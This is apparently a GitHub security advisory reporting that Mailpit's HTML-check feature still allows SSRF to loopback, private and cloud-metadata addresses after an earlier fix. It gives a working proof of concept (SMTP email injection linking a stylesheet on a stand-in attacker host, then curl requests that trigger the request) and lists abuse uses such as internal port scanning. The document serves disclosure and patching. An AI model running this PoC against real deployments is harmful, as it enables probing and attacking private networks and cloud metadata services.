# [M] Mailpit has an incomplete fix for GHSA-6jxm: HTML check still permits SSRF to private/loopback/IMDS via missing IP-filter dialer

## Summary
Severity: Medium
Advisory: GHSA-j3fj-qppj-fmmc
CVE: CVE-2026-45709
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N (CVSS_V3)
Published: 2026-05-19
Source: https://github.com/advisories/GHSA-j3fj-qppj-fmmc
Type: github-advisory

## Affected
- Go: `github.com/axllent/mailpit` — affected >=1.28.3 <1.30.0

## Details
## Summary

The fix for GHSA-6jxm-fv7w-rw5j (CVE-2026-23845, "Server-Side Request Forgery (SSRF) via HTML Check API"), shipped in mailpit `v1.28.3`, hardened `internal/htmlcheck/css.go::downloadCSSToBytes` with a 5MB size cap, a `text/css` content-type check, login-info stripping in `isValidURL`, and an opt-in `--block-remote-css-and-fonts` config flag — but **did not add the IP-filtering dialer that the same codebase already uses on the two sister SSRF endpoints** (the proxy handler and link-check). At HEAD `8bc966e61834a24c48b4465da418f75e73be0afd` (2026-05-06), `internal/htmlcheck/css.go::newSafeHTTPClient` is mis-named — it builds an `http.Client` whose `Transport.DialContext` calls `net.Dialer.DialContext` directly with no IP allowlisting. As a result, the SSRF originally reported by Bao Anh Phan still permits the server to dial:

- loopback (`127.0.0.0/8`, `::1`),
- private (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `fc00::/7`),
- link-local incl. **cloud IMDS** (`169.254.0.0/16`, especially `169.254.169.254`),
- CGNAT (`100.64.0.0/10`),
- and any other reserved/multicast range,

— provided the target replies with `HTTP/200` and a content-type beginning with `text/css`. With redirect-following (`CheckRedirect` allows redirects to any `isValidURL` URL with no IP filter), an attacker-controlled public site can redirect mailpit's request into the private network without ever appearing in the email's HTML.

In the default mailpit deploy (no UI auth, no SMTP auth, port 1025/8025 exposed), this is an unauthenticated, network-reachable SSRF triggered by sending an HTML email and then issuing one HTTP `GET` to `/api/v1/message/{id}/html-check`.

## Affected versions

- `internal/htmlcheck/css.go` at HEAD `8bc966e61834a24c48b4465da418f75e73be0afd` (2026-05-06).
- All versions `>= v1.28.3` (the version that shipped the GHSA-6jxm fix). Versions `<= v1.28.2` are vulnerable to the original GHSA-6jxm; versions `>= v1.28.3` carry the still-vulnerable variant described here.

## The incomplete fix

The original GHSA-6jxm fix added size+content-type+login-info hardening to `downloadCSSToBytes`. But the dialer it uses still has no `safeDialContext`. The companion `linkcheck` and `proxy` handlers in the same codebase have all-three protections: size cap, content-type/redirect filter, **AND** a `safeDialContext` that runs `tools.IsInternalIP(ip.IP)` per resolved address — same pattern the htmlcheck dialer should adopt.

Side-by-side at HEAD `8bc966e`:

| File | Function | `safeDialContext` (IP filter)? | TOCTOU-safe (dial-by-IP)? |
|---|---|---|---|
| `internal/linkcheck/status.go::safeDialContext` line 140-163 | dial check | YES | YES (resolved IP joined with port) |
| `server/handlers/proxy.go::safeDialContext` line 393-415 | dial check | YES | YES |
| `internal/htmlcheck/css.go::newSafeHTTPClient` line 275-310 | dial check | **NO** | n/a |

The mis-named `newSafeHTTPClient` reads:

```go
// internal/htmlcheck/css.go:275-310
func newSafeHTTPClient() *http.Client {
    dialer := &net.Dialer{
        Timeout:   5 * time.Second,
        KeepAlive: 30 * time.Second,
    }

    tr := &http.Transport{
        Proxy: nil,
        DialContext: func(ctx context.Context, network, address string) (net.Conn, error) {
            return dialer.DialContext(ctx, network, address)   // no IP filter
        },
        ...
    }

    client := &http.Client{
        Transport: tr,
        Timeout:   15 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 3 { return errors.New("too many redirects") }
            if !isValidURL(req.URL.String()) { return errors.New("invalid redirect URL") }
            return nil
        },
    }
    return client
}
```

`isValidURL` only rejects non-http(s) and userinfo URLs — it does NOT reject internal IPs. Compare `linkcheck/status.go::safeDialContext`:

```go
ips, err := net.DefaultResolver.LookupIPAddr(ctx, host)
...
if !config.AllowInternalHTTPRequests {
    for _, ip := range ips {
        if tools.IsInternalIP(ip.IP) {
            return nil, fmt.Errorf("blocked request to %s (%s): private/reserved address", host, ip)
        }
    }
}
return dialer.DialContext(ctx, network, net.JoinHostPort(ips[0].IP.String(), port))
```

That's the protection htmlcheck is missing.

## Reachability chain (default deploy)

```
Listen()                                 # config/config.go:36 SMTPListen = "[::]:1025"
   ↓
SMTP server                              # internal/smtpd/main.go:222-249  AuthRequired: false, AuthHandler: nil
   ↓ attacker injects HTML body with <link rel="stylesheet" href="...attacker.com/redirect.css">
   ↓
storage.Store(...)
   ↓
Listen()                                 # server/server.go HTTPListen
   ↓ attacker sends GET /api/v1/message/{id}/html-check
apiv1.HTMLCheck                          # server/apiv1/other.go:18
   ↓ no UI auth in default deploy (auth.UICredentials == nil)
htmlcheck.RunTests(msg.HTML)             # internal/htmlcheck/main.go:17
   ↓
runCSSTests → inlineRemoteCSS            # internal/htmlcheck/css.go:25, 132
   ↓
downloadCSSToBytes(href)                 # internal/htmlcheck/css.go:192
   ↓
newSafeHTTPClient()                      # internal/htmlcheck/css.go:275
   ↓ no IP filter on Transport.DialContext or CheckRedirect
client.Do(req) → attacker-controlled origin → 302 redirect to internal IP → success
```

## PoC

Default-deploy reproduction (no auth):

```bash
# 1) start mailpit with defaults (no --smtp-auth, no --ui-auth)
docker run -p 1025:1025 -p 8025:8025 axllent/mailpit:latest

# 2) attacker hosts a redirect to an internal target
#    e.g., http://attacker.example.com/test.css → 302 → http://169.254.169.254/...

# 3) inject email via SMTP (no auth required)
python3 - <<'EOF'
import smtplib
from email.mime.text import MIMEText
html = '''<!DOCTYPE html><html><head>
  <link rel="stylesheet" href="http://attacker.example.com/test.css">
</head><body>x</body></html>'''
m = MIMEText(html, 'html')
m['Subject'] = 'mailpit-001'
m['From'] = 'a@b'
m['To']   = 'c@d'
with smtplib.SMTP('localhost', 1025) as s:
    s.send_message(m)
EOF

# 4) get the message ID
ID=$(curl -s http://localhost:8025/api/v1/messages?limit=1 | jq -r '.messages[0].ID')

# 5) trigger the SSRF with one anonymous GET
curl -i http://localhost:8025/api/v1/message/$ID/html-check
```

The HTTP server-side dial follows `http://attacker.example.com/test.css` → 302 redirect to `http://127.0.0.1:6379/` → mailpit completes a TCP connect to the loopback Redis. No request body is reflected to the attacker (mailpit only inlines successful 200 + `text/css` responses), but:

- **State-changing internal GETs.** Any internal admin app served on `127.0.0.1` or RFC1918 with a "GET /admin/restart", "GET /vacuum", "GET /flush" pattern can be triggered through this primitive. Several common stacks (Spring Actuator, etcd debug, internal Prometheus admin, Redis HTTP front-ends, Jaeger UI) expose such operations on private ports.
- **Cloud-IMDS reachability oracle.** Because IMDS responses don't carry `text/css`, the body is not inlined — but the redirect chain DOES dial 169.254.169.254. A side-channel (response time, DNS log) can confirm IMDS reachability from a default-deploy mailpit on cloud.
- **Internal port-scan via timing.** The 5s+15s timeouts produce a clear timing differential between "RST refused" (~ms), "open and HTTP-noisy" (~10ms+), and "filtered" (multi-second).
- **Authenticated `Mailpit/<version>` GET.** Every internal target sees a known UA from a trusted internal subnet; combined with redirect-stripping, this can fool internal allowlists keyed on UA.

## Threat model alignment

The maintainer's prior position on the SSRF class is captured by GHSA-6jxm-fv7w-rw5j (HTML Check, Medium), GHSA-mpf7-p9x7-96r3 (Link Check, Medium), and GHSA-8v65-47jx-7mfr (Proxy Endpoint, Medium). All three are siblings in the same SSRF class, and the maintainer chose to remediate each via a `safeDialContext`-style filter in the linkcheck and proxy fixes. The htmlcheck fix is the outlier: same class, same severity, but the IP filter was not applied. The remaining surface is therefore a regression of the published fix's stated goal ("disallow internal targets").

Default-deploy reachability is unauthenticated (per the maintainer's own README, mailpit is intended to run without auth in dev/CI). With UI auth configured, the same primitive is post-auth — still useful (UI-auth mailpit deployments often live on the internal/ops subnet, exposing other ops services).

## Suggested fix

Make `newSafeHTTPClient` use the same `safeDialContext` pattern already proven in `linkcheck/status.go` and `server/handlers/proxy.go`. Concretely:

```go
// internal/htmlcheck/css.go
func newSafeHTTPClient() *http.Client {
    dialer := &net.Dialer{
        Timeout:   5 * time.Second,
        KeepAlive: 30 * time.Second,
    }

    tr := &http.Transport{
        Proxy:                 nil,
        DialContext:           safeDialContext(dialer),  // ← add IP filter
        TLSHandshakeTimeout:   5 * time.Second,
        ResponseHeaderTimeout: 10 * time.Second,
        ExpectContinueTimeout: 1 * time.Second,
        IdleConnTimeout:       30 * time.Second,
        MaxIdleConns:          50,
    }

    client := &http.Client{
        Transport: tr,
        Timeout:   15 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            if len(via) >= 3 {
                return errors.New("too many redirects")
            }
            if !isValidURL(req.URL.String()) {
                return errors.New("invalid redirect URL")
            }
            // safeDialContext re-runs IP filter on each hop's Dial,
            // so redirect target IP is also enforced.
            return nil
        },
    }
    return client
}

// safeDialContext is the same pattern as linkcheck/status.go::safeDialContext
// — copy the function (or factor a shared helper into internal/tools/net.go).
func safeDialContext(dialer *net.Dialer) func(ctx context.Context, network, address string) (net.Conn, error) {
    return func(ctx context.Context, network, address string) (net.Conn, error) {
        host, port, err := net.SplitHostPort(address)
        if err != nil { return nil, err }
        ips, err := net.DefaultResolver.LookupIPAddr(ctx, host)
        if err != nil { return nil, err }
        if !config.AllowInternalHTTPRequests {
            for _, ip := range ips {
                if tools.IsInternalIP(ip.IP) {
                    return nil, fmt.Errorf("blocked request to %s (%s): private/reserved address", host, ip)
                }
            }
        }
        return dialer.DialContext(ctx, network, net.JoinHostPort(ips[0].IP.String(), port))
    }
}
```

Two further hardening notes:

1. **Add CGNAT 100.64.0.0/10 (RFC 6598).** `tools.IsInternalIP` covers loopback, private, link-local, multicast, unspecified — but not CGNAT. This affects all three SSRF dialers (htmlcheck, linkcheck, proxy). Tailscale tailnets and GCP IAP fall in `100.64.0.0/10`; an mailpit instance running on a Tailscale node can be used to pivot into the tailnet. Concrete fix: extend `tools.IsInternalIP` with `cgnat := net.IPNet{IP: net.IPv4(100, 64, 0, 0), Mask: net.CIDRMask(10, 32)}; if cgnat.Contains(ip) { return true }`.
2. **Re-validate the rename.** `newSafeHTTPClient` is a misleading name today — once the dialer is hardened, the name will be accurate. Until then, consider renaming it to `newHTTPClient` to remove the false sense of safety it conveys to maintainers reading the file.

## Reproduction environment

- Tested against: HEAD `8bc966e61834a24c48b4465da418f75e73be0afd` (2026-05-06).
- Code locations:
  - Vulnerable dialer: `internal/htmlcheck/css.go:275-310`
  - Vulnerable downloader: `internal/htmlcheck/css.go:192-229`
  - Reachability gate: `internal/htmlcheck/css.go:131-187` (`inlineRemoteCSS`)
  - Trigger handler: `server/apiv1/other.go:18-79` (`HTMLCheck`)
  - Default no-UI-auth: `internal/auth/auth.go` + middleware in `server/server.go:317`
  - Default no-SMTP-auth: `internal/smtpd/main.go:229-230`
  - Sister fixed dialers (for diff): `internal/linkcheck/status.go:140-163`, `server/handlers/proxy.go:393-415`

## Reporter

Eddie Ran. Filed via reporter API.

## References
- https://github.com/axllent/mailpit/security/advisories/GHSA-j3fj-qppj-fmmc
- https://github.com/axllent/mailpit
